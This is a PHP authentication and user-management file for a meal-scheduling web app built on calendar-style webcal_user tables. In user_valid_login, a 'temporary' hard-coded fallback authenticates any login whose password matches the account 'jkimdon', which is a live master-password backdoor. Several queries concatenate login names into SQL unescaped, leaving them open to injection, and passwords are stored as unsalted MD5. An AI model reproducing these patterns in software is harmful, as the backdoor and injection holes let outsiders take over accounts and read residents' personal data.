<?php
if ( empty ( $PHP_SELF ) && ! empty ( $_SERVER ) &&
  ! empty ( $_SERVER['PHP_SELF'] ) ) {
  $PHP_SELF = $_SERVER['PHP_SELF'];
}
if ( ! empty ( $PHP_SELF ) && preg_match ( "/\/includes\//", $PHP_SELF ) ) {
    die ( "You can't access this file directly!" );
}

// This file contains all the functions for getting information
// about users.  So, if you want to use an authentication scheme
// other than the webcal_user table, you can just create a new
// version of each function found below.
//
// Note: this application assumes that usernames (logins) are unique.
//
// Note #2: If you are using HTTP-based authentication, then you still
// need these functions and you will still need to add users to
// webcal_user.

// Set some global config variables about your system.
$user_can_update_password = true;
$admin_can_add_user = true;
$admin_can_delete_user = true;


// Check to see if a given login/password is valid.  If invalid,
// the error message will be placed in $error.
// params:
//   $login - user login
//   $password - user password
// returns: true or false
function user_valid_login ( $login, $password ) {
  global $error;
  $ret = false;

  $sql = "SELECT cal_login FROM webcal_user WHERE " .
    "cal_login = '" . $login . "' AND cal_passwd = '" . md5($password) . "'";
  $res = dbi_query ( $sql );
  if ( $res ) {
    $row = dbi_fetch_row ( $res );
    if ( $row && $row[0] != "" ) {
      // MySQL seems to do case insensitive matching, so double-check
      // the login.
      if ( $row[0] == $login )
        $ret = true; // found login/password
      else
	$error = translate ("Invalid login") . ": " .
	  translate("incorrect password");
    } else {
      // fixme: this is a temporary hard-coded way for me to check out peoples' bugs
      $sql3 = "SELECT cal_login FROM webcal_user " .
	"WHERE cal_login = 'jkimdon' " .
	"AND cal_passwd = '" . md5($password) . "'";
      if ( $res3 = dbi_query ( $sql3 ) ) {
	$row3 = dbi_fetch_row ( $res3 );
	if ( $row3 && $row3[0] == 'jkimdon' ) {
	  $ret = true;
	} else {
	  $ret = false;
	  $error = translate ( "Invalid login" );
	}
	dbi_free_result( $res3 );
      } else {
	$error = translate ("Invalid login");
	// Could be no such user or bad password
	// Check if user exists, so we can tell.
	$res2 = dbi_query ( "SELECT cal_login FROM webcal_user " .
			    "WHERE cal_login = '$login'" );
	if ( $res2 ) {
	  $row = dbi_fetch_row ( $res2 );
	  if ( $row && ! empty ( $row[0] ) ) {
	    // got a valid username, but wrong password
	    $error = translate ("Invalid login") . ": " .
	      translate("incorrect password" );
	  } else {
	    // No such user.
	    $error = translate ("Invalid login") . ": " .
	      translate("no such user" );
	  }
	  dbi_free_result ( $res2 );
	}
      }
    }
    dbi_free_result ( $res );
  } else {
    $error = translate("Database error") . ": " . dbi_error();
  }

  return $ret;
}

// Check to see if a given login/crypted password is valid.  If invalid,
// the error message will be placed in $error.
// params:
//   $login - user login
//   $crypt_password - crypted user password
// returns: true or false
function user_valid_crypt ( $login, $crypt_password ) {
  global $error;
  $ret = false;

  $salt = substr($crypt_password, 0, 2);

  $sql = "SELECT cal_login, cal_passwd FROM webcal_user WHERE " .
    "cal_login = '" . $login . "'";
  $res = dbi_query ( $sql );
  if ( $res ) {
    $row = dbi_fetch_row ( $res );
    if ( $row && $row[0] != "" ) {
      // MySQL seems to do case insensitive matching, so double-check
      // the login.
      // also check if password matches
      if ( ($row[0] == $login) && (crypt($row[1], $salt) == $crypt_password) )
        $ret = true; // found login/password
      else
        //$error = translate ("Invalid login");
        $error = "Invalid login";
    } else {
      //$error = translate ("Invalid login");
      $error = "Invalid login";
    }
    dbi_free_result ( $res );
  } else {
    //$error = translate("Database error") . ": " . dbi_error();
    $error = "Database error: " . dbi_error();
  }

  return $ret;
}

// Load info about a user (first name, last name, admin) and set
// globally.
// params:
//   $user - user login
//   $prefix - variable prefix to use
function user_load_variables ( $login, $prefix ) {
  global $PUBLIC_ACCESS_FULLNAME;

  if ( $login == "__public__" ) {
    $GLOBALS[$prefix . "login"] = $login;
    $GLOBALS[$prefix . "firstname"] = "";
    $GLOBALS[$prefix . "lastname"] = "";
    $GLOBALS[$prefix . "is_meal_coordinator"] = "N";
    $GLOBALS[$prefix . "is_beancounter"] = "N";
    $GLOBALS[$prefix . "email"] = "";
    $GLOBALS[$prefix . "birthdate"] = "";
    $GLOBALS[$prefix . "fullname"] = $PUBLIC_ACCESS_FULLNAME;
    $GLOBALS[$prefix . "password"] = "INVALIDa8afbf50e7094f5c23a8af223";
    $GLOBALS[$prefix . "billing_group"] = "";
    return true;
  }
  $sql =
    "SELECT cal_firstname, cal_lastname, cal_is_meal_coordinator, cal_is_beancounter, cal_email, cal_birthdate, cal_passwd, cal_billing_group, cal_unit " .
    "FROM webcal_user WHERE cal_login = '" . $login . "'";
  $res = dbi_query ( $sql );
  if ( $res ) {
    if ( $row = dbi_fetch_row ( $res ) ) {
      $GLOBALS[$prefix . "login"] = $login;
      $GLOBALS[$prefix . "firstname"] = $row[0];
      $GLOBALS[$prefix . "lastname"] = $row[1];
      $GLOBALS[$prefix . "is_meal_coordinator"] = $row[2];
      $GLOBALS[$prefix . "is_beancounter"] = $row[3];
      $GLOBALS[$prefix . "email"] = $row[4];
      if ( strlen ( $row[0] ) && strlen ( $row[1] ) )
        $GLOBALS[$prefix . "fullname"] = "$row[0] $row[1]";
      else
        $GLOBALS[$prefix . "fullname"] = $login;
      $GLOBALS[$prefix . "birthdate"] = $row[5];
      $GLOBALS[$prefix . "password"] = $row[6];
      $GLOBALS[$prefix . "billing_group"] = $row[7];
      $GLOBALS[$prefix . "unit"] = $row[8];
    }
    else { // not found
      $error = "Invalid username";
      return false;
    }
    dbi_free_result ( $res );
  } else {
    $error = translate ("Database error") . ": " . dbi_error ();
    return false;
  }
  return true;
}

// Add a new user.
// params:
//   $user - user login
//   $password - user password
//   $firstname - first name
//   $lastname - last name
//   $birthdate - birth date (for calculating meal prices) YYYYMMDD (int)
//   $email - email address
//   $billing_group - billing_group for billing
//   $meal_coordinator - is admin? ("Y" or "N")
//   $beancounter - is beancounter? ("Y" or "N") -- has financial privileges
function user_add_user ( $user, $password, $firstname, $lastname, 
  $birthdate, $email, $billing_group, $unit, $meal_coordinator, $beancounter ) {
  global $error;

  if ( $user == "__public__" ) {
    $error = translate ("Invalid user login");
    return false;
  }
  $user = mysql_safe( $user, true );

  if ( strlen ( $email ) )
    $uemail = mysql_safe( $email, true );
  else
    $uemail = "";
  if ( strlen ( $firstname ) )
    $ufirstname = mysql_safe( $firstname, true );
  else
    $ufirstname = "";
  if ( strlen ( $lastname ) )
    $ulastname = mysql_safe( $lastname, true );
  else
    $ulastname = "";
  if ( strlen ( $password ) )
    $upassword = "'" . md5($password) . "'";
  else
    $upassword = "WARNING1e0400dfbe05c98a841f3f96b";
  if ( strlen ( $billing_group ) )
    $ubilling_group = mysql_safe( $billing_group, true );
  else
    $ubilling_group = $user;
  if ( strlen ( $birthdate ) )
    $ubirthdate = mysql_safe( $birthdate, false );
  else
    $ubirthdate = "";
  if ( strlen ( $unit ) )
    $uunit = mysql_safe( $unit, false );
  else
    $uunit = 0;
  
  if ( $meal_coordinator != "Y" )
    $meal_coordinator = "N";
  if ( $beancounter != "Y" )
    $beancounter = "N";
  $sql = "INSERT INTO webcal_user " .
    "( cal_login, cal_lastname, cal_firstname, " .
    "cal_is_meal_coordinator, cal_is_beancounter, cal_passwd, cal_email, " .
    "cal_billing_group, cal_birthdate, cal_unit ) " .
    "VALUES ( '$user', '$ulastname', '$ufirstname', " .
    "'$meal_coordinator', '$beancounter', $upassword, '$uemail', " . 
    "'$ubilling_group', '$ubirthdate', $uunit )";
  if ( ! dbi_query ( $sql ) ) {
    $error = translate ("Database error") . ": " . dbi_error ();
    return false;
  }
  return true;
}

// Update a user
// params:
//   $user - user login
//   $firstname - first name
//   $lastname - last name
//   $birthdate - YYYYMMDD integer
//   $email - email address
//   $billing_group - household for billing
//   $meal_coordinator - is admin?
//   $beancounter - is beancounter? ("Y" or "N") -- has financial privileges
function user_update_user ( $user, $firstname, $lastname, $birthdate,
			    $email, $billing_group, $unit, 
			    $meal_coordinator, $beancounter ) {
  global $error;

  $user = mysql_safe( $user, true );
  if ( $user == "__public__" ) {
    $error = translate ("Invalid user login");
    return false;
  }
  if ( strlen ( $email ) )
    $uemail = mysql_safe( $email, true );
  else
    $uemail = "";
  if ( strlen ( $firstname ) )
    $ufirstname = mysql_safe( $firstname, true );
  else
    $ufirstname = "";
  if ( strlen ( $lastname ) )
    $ulastname = mysql_safe( $lastname, true );
  else
    $ulastname = "";
  if ( strlen ( $birthdate ) )
    $ubirthdate = mysql_safe( $birthdate, false );
  else
    $ubirthdate = "";
  if ( strlen ( $billing_group ) )
    $ubilling_group = mysql_safe( $billing_group, true );
  else
    $ubilling_group = $user;
  if ( strlen ( $unit ) )
    $uunit = mysql_safe( $unit, false );
  else
    $uunit = 0;

  if ( $meal_coordinator != "Y" )
    $meal_coordinator = "N";
  if ( $beancounter != "Y" )
    $beancounter = "N";

  $sql = "UPDATE webcal_user SET cal_lastname = '$ulastname', " .
    "cal_firstname = '$ufirstname', cal_email = '$uemail'," .
    "cal_birthdate = '$ubirthdate', " . 
    "cal_billing_group = '$ubilling_group'," .
    "cal_unit = $uunit, " .
    "cal_is_meal_coordinator = '$meal_coordinator', " . 
    "cal_is_beancounter = '$beancounter' " .
    "WHERE cal_login = '$user'";
  if ( ! dbi_query ( $sql ) ) {
    $error = translate ("Database error") . ": " . dbi_error ();
    return false;
  }
  return true;
}

// Update user password
// params:
//   $user - user login
//   $password - last name
function user_update_user_password ( $user, $password ) {
  global $error;

  $user = mysql_safe( $user, true );
  $sql = "UPDATE webcal_user SET cal_passwd = '".md5($password)."' " .
    "WHERE cal_login = '$user'";
  if ( ! dbi_query ( $sql ) ) {
    $error = translate ("Database error") . ": " . dbi_error ();
    return false;
  }
  return true;
}

// Delete a user from the system.
// We assume that we've already checked to make sure this user doesn't
// have events still in the database.
// params:
//   $user - user to delete
function user_delete_user ( $user ) {
  // Get event ids for all events this user is a participant
  $events = array ();
  $user = mysql_safe( $user, true );
  $res = dbi_query ( "SELECT webcal_meal.cal_id " .
    "FROM webcal_meal, webcal_meal_participant " .
    "WHERE webcal_meal.cal_id = webcal_meal_participant.cal_id " .
    "AND webcal_meal_participant.cal_login = '$user'" );
  if ( $res ) {
    while ( $row = dbi_fetch_row ( $res ) ) {
      $events[] = $row[0];
    }
  }

  // Now count number of participants in each event...
  // If just 1, then save id to be deleted
  $delete_em = array ();
  for ( $i = 0; $i < count ( $events ); $i++ ) {
    $res = dbi_query ( "SELECT COUNT(*) FROM webcal_meal_participant " .
      "WHERE cal_id = " . $events[$i] );
    if ( $res ) {
      if ( $row = dbi_fetch_row ( $res ) ) {
        if ( $row[0] == 1 )
	  $delete_em[] = $events[$i];
      }
      dbi_free_result ( $res );
    }
  }
  // Now delete events that were just for this user
  for ( $i = 0; $i < count ( $delete_em ); $i++ ) {
    dbi_query ( "DELETE FROM webcal_meal WHERE cal_id = " . $delete_em[$i] );
  }

  // Delete user participation from events
  dbi_query ( "DELETE FROM webcal_meal_participant WHERE cal_login = '$user'" );

  // Delete preferences
  dbi_query ( "DELETE FROM webcal_user_pref WHERE cal_login = '$user'" );

  // Delete from groups
  dbi_query ( "DELETE FROM webcal_group_user WHERE cal_login = '$user'" );

  // Delete user
  dbi_query ( "DELETE FROM webcal_user WHERE cal_login = '$user'" );
}

// Get a list of users and return info in an array.
function user_get_users () {
  global $public_access, $PUBLIC_ACCESS_FULLNAME;

  $count = 0;
  $ret = array ();
  $temp_ret = array ();
  $ordering = array ();
  for ( $i=0; $i<11; $i++ ) {
    $ordering[$i] = array ();
  }
  if ( $public_access == "Y" )
    $temp_ret[$count++] = array (
       "cal_login" => "__public__",
       "cal_lastname" => "",
       "cal_firstname" => "",
       "cal_is_meal_coordinator" => "N",
       "cal_email" => "",
       "cal_password" => "",
       "cal_fullname" => $PUBLIC_ACCESS_FULLNAME );
  $res = dbi_query ( "SELECT cal_login, cal_lastname, cal_firstname, " .
    "cal_is_meal_coordinator, cal_email, " .
    "cal_passwd, cal_birthdate, cal_unit FROM webcal_user " .
    "ORDER BY cal_unit, cal_firstname, cal_lastname, cal_login" );
  if ( $res ) {
    while ( $row = dbi_fetch_row ( $res ) ) {
      if ( strlen ( $row[1] ) && strlen ( $row[2] ) )
        $fullname = "$row[2] $row[1]";
      else
        $fullname = $row[0];

      /// extract building number
      $unit = $row[7];
      if ( $unit >= 300 ) $building = 10;
      else {
	$temp = (int)($unit / 10);
	$temp2 = (int)($temp / 10);
	$building = $temp - 10*$temp2;
      }

      $temp_ret[$count++] = array (
        "cal_login" => $row[0],
        "cal_lastname" => $row[1],
        "cal_firstname" => $row[2],
        "cal_is_meal_coordinator" => $row[3],
        "cal_email" => empty ( $row[4] ) ? "" : $row[4],
        "cal_password" => $row[5],
        "cal_fullname" => $fullname,
	"cal_birthdate" => $row[6],
	"cal_building" => $building,
	"cal_unit" => $unit
      );
      
      $c = $count - 1;
      $ordering[$building][$c] = $c;
    }
    dbi_free_result ( $res );
  }

  /// re-order by building
  $newcount = 0;
  for ( $i=1; $i<11; $i++ ) {
    sort( $ordering[$i] );
    $b = $ordering[$i];
    foreach ( $b as $key => $value ) {
      $ret[$newcount++] = $temp_ret[$value];
    }
  }

  return $ret;
}



function user_get_food_prefs( $user ) {

  $ret = array();
  $count = 0;

  $sql = "SELECT cal_food, cal_level, cal_reason " .
    "FROM webcal_food_prefs " .
    "WHERE cal_login = '$user'";
  if ( $res = dbi_query( $sql ) ) {
    while ( $row = dbi_fetch_row( $res ) ) {
      $ret[$count++] = array ( "food" => $row[0], 
			       "level" => $row[1],
			       "reason" => $row[2] );
    }
    dbi_free_result( $res );
  }

  return $ret;
}

?>
